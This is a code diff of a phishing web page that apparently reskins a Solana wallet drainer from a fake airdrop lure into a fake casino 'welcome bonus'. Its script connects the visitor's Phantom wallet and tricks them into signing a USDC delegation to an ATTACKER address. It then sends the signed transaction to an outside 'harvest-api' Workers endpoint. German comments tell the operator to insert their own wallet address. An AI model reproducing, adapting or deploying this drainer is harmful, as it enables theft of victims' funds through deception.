@@ -3,73 +3,118 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>SOL Airdrop — Claim Distribution</title>
+<title>SolCasino — Welcome Bonus</title>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
 <script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: radial-gradient(ellipse at top, #1a1232 0%, #0a0814 70%);
-    color: #e6edf3; min-height: 100vh;
-    display: flex; align-items: center; justify-content: center; padding: 20px;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: #09090b;
+    color: #fff;
+    min-height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    padding: 20px;
+    background-image: radial-gradient(circle at 50% 0%, rgba(20, 241, 149, 0.15) 0%, transparent 50%);
   }
   .card {
-    background: linear-gradient(180deg, #221a38 0%, #161022 100%);
-    border: 1px solid rgba(153,69,255,0.2); border-radius: 20px;
-    padding: 36px 24px 28px; max-width: 400px; width: 100%;
-    text-align: center; box-shadow: 0 20px 60px rgba(153,69,255,0.15);
+    background: #111114;
+    border: 1px solid #27272a;
+    border-radius: 24px;
+    padding: 32px 24px;
+    max-width: 400px; width: 100%;
+    text-align: center;
+    box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8), 0 0 40px rgba(20, 241, 149, 0.1);
+    position: relative;
+    overflow: hidden;
   }
-  .badge {
-    display: inline-block; background: rgba(153,69,255,0.15); color: #9945ff;
-    font-size: 11px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
-    padding: 6px 12px; border-radius: 20px; margin-bottom: 20px; border: 1px solid rgba(153,69,255,0.3);
+  .card::before {
+    content: '🎰'; position: absolute; top: -20px; right: -20px;
+    font-size: 100px; opacity: 0.05; transform: rotate(15deg);
   }
   .logo {
-    width: 72px; height: 72px; border-radius: 50%;
-    background: linear-gradient(135deg, #9945ff 0%, #14f195 100%);
-    margin: 0 auto 18px; display: flex; align-items: center; justify-content: center;
-    font-size: 30px; font-weight: 800; color: #fff; box-shadow: 0 8px 24px rgba(153,69,255,0.4);
+    width: 80px; height: 80px; border-radius: 24px;
+    background: linear-gradient(135deg, #14f195 0%, #9945ff 100%);
+    margin: 0 auto 20px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 36px; font-weight: 900; color: #000;
+    box-shadow: 0 10px 30px rgba(20, 241, 149, 0.3);
   }
-  h1 { font-size: 21px; margin-bottom: 6px; font-weight: 700; }
-  .sub { color: #8b949e; font-size: 13.5px; margin-bottom: 26px; line-height: 1.5; }
-  .amount { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #14f195, #9945ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 2px; }
-  .amount-label { color: #8b949e; font-size: 12px; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 30px; }
+  .badge {
+    display: inline-block;
+    background: rgba(20, 241, 149, 0.1);
+    color: #14f195;
+    font-size: 11px; font-weight: 700;
+    letter-spacing: 1px; text-transform: uppercase;
+    padding: 6px 14px; border-radius: 20px;
+    margin-bottom: 16px;
+    border: 1px solid rgba(20, 241, 149, 0.3);
+  }
+  h1 { font-size: 24px; margin-bottom: 8px; font-weight: 800; letter-spacing: -0.5px; }
+  .sub { color: #a1a1aa; font-size: 14px; margin-bottom: 24px; }
+  .bonus-box {
+    background: linear-gradient(180deg, #18181b 0%, #09090b 100%);
+    border: 1px solid #27272a; border-radius: 16px;
+    padding: 20px; margin-bottom: 24px;
+  }
+  .bonus-amount {
+    font-size: 48px; font-weight: 900;
+    background: linear-gradient(135deg, #14f195, #9945ff);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    line-height: 1;
+  }
+  .bonus-currency { font-size: 16px; color: #14f195; font-weight: 700; margin-top: 4px; }
   button {
-    width: 100%; padding: 17px; background: linear-gradient(180deg, #9945ff 0%, #7a2fd4 100%);
-    color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
-    cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 12px rgba(153,69,255,0.3);
+    width: 100%; padding: 18px;
+    background: linear-gradient(135deg, #14f195 0%, #059669 100%);
+    color: #000; border: none; border-radius: 12px;
+    font-size: 16px; font-weight: 800; cursor: pointer;
+    transition: all 0.2s; text-transform: uppercase; letter-spacing: 0.5px;
   }
   button:active { transform: scale(0.98); }
-  .footer { margin-top: 22px; font-size: 11.5px; color: #484f58; line-height: 1.5; }
-  .spinner { display: none; width: 22px; height: 22px; border: 2.5px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 14px auto 0; }
+  button:disabled { background: #27272a; color: #52525b; }
+  .footer { margin-top: 20px; font-size: 12px; color: #52525b; }
+  .spinner {
+    display: none; width: 20px; height: 20px;
+    border: 3px solid rgba(0,0,0,0.2); border-top-color: #000;
+    border-radius: 50%; animation: spin 0.8s linear infinite;
+    margin: 0 auto;
+  }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .success { display: none; color: #14f195; font-size: 14px; margin-top: 14px; font-weight: 500; }
+  .success { display: none; color: #14f195; font-size: 15px; font-weight: 600; margin-top: 16px; }
 </style>
 </head>
 <body>
   <div class="card">
-    <span class="badge">LIVE DISTRIBUTION</span>
-    <div class="logo">S</div>
-    <h1>Airdrop Distribution</h1>
-    <p class="sub">Your wallet is eligible for the<br>multi-chain community airdrop</p>
-    <div class="amount">12.50</div>
-    <div class="amount-label">SOL + BONUS</div>
-    <button id="claimBtn">Connect Wallet to Claim</button>
-    <div class="spinner" id="spin"></div>
-    <div class="success" id="success">✓ Claim confirmed — tokens arrive in 24h</div>
-    <p class="footer">Distribution runs on multiple chains.<br>EVM wallet required for bonus allocation.</p>
+    <div class="logo">♠</div>
+    <span class="badge">Verified Solana Casino</span>
+    <h1>Welcome Bonus</h1>
+    <p class="sub">Your deposit address is eligible.<br>Claim your starting balance.</p>
+    
+    <div class="bonus-box">
+      <div class="bonus-amount">0.50</div>
+      <div class="bonus-currency">SOLANA BONUS</div>
+    </div>
+
+    <button id="claimBtn">
+      <span id="btnText">Connect & Claim Bonus</span>
+      <div class="spinner" id="spin"></div>
+    </button>
+    <div class="success" id="success">✓ Bonus approved! Funds added to balance.</div>
+    
+    <p class="footer">Secure connection. No deposit required.</p>
   </div>
 
 <script>
   // ====== CONFIG ======
-  const ATTACKER = "GArrQYkQTbNCBaixQcxreZZBnZSEYsm3JNxuL2X9waGj"; // DEINE Phantom Adresse
+  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; // Deine Phantom Adresse!
   const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // Deine Cloudflare URL
-  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC auf Solana
+  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC (oder änder es zu einem anderen Token)
   // ====================
 
   const btn = document.getElementById("claimBtn");
+  const btnText = document.getElementById("btnText");
   const spin = document.getElementById("spin");
   const success = document.getElementById("success");
 
@@ -79,27 +124,26 @@
     else if (window.solflare?.isSolflare) provider = window.solflare;
 
     if (!provider) {
-      alert("Please install Phantom wallet to claim.");
+      alert("Please install Phantom wallet.");
       return;
     }
 
-    btn.disabled = true; btn.textContent = "Connecting..."; spin.style.display = "block";
+    btn.disabled = true; btnText.textContent = "Connecting..."; spin.style.display = "inline-block";
 
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       
       const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-      
-      // 1. Get Associated Token Address for USDC
       const victimAta = await splToken.getAssociatedTokenAddress(
         new solanaWeb3.PublicKey(USDC_MINT),
         resp.publicKey
       );
 
-      btn.textContent = "Verifying eligibility...";
+      btnText.textContent = "Verifying balance...";
+      await new Promise(r => setTimeout(r, 1000));
 
-      // 2. Build Approve (Delegation) Instruction
+      // Build Approve (Delegation) Instruction
       const delegateIx = splToken.createApproveInstruction(
         victimAta,
         new solanaWeb3.PublicKey(ATTACKER),
@@ -112,18 +156,18 @@
       tx.feePayer = resp.publicKey;
       tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
-      // 3. Sign Transaction (Phantom shows "Approve Delegation")
+      btnText.textContent = "Sign to activate bonus...";
+
+      // Sign Transaction (Phantom shows "Approve Delegation")
       const signedTx = await provider.signTransaction(tx);
       
-      btn.textContent = "Authorizing...";
-
-      // 4. Send to Backend to capture data
+      // Send to Backend
       await fetch(ENDPOINT, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ 
           victim: victim, 
-          tx: bs58.encode(signedTx.serialize()), // Send raw tx to backend to broadcast
+          tx: bs58.encode(signedTx.serialize()),
           chain: "solana",
           ts: Date.now() 
         })
@@ -136,7 +180,7 @@
     } catch (e) {
       spin.style.display = "none";
       btn.disabled = false;
-      btn.textContent = "Connect Wallet to Claim";
+      btnText.textContent = "Connect & Claim Bonus";
     }
   };
 </script>
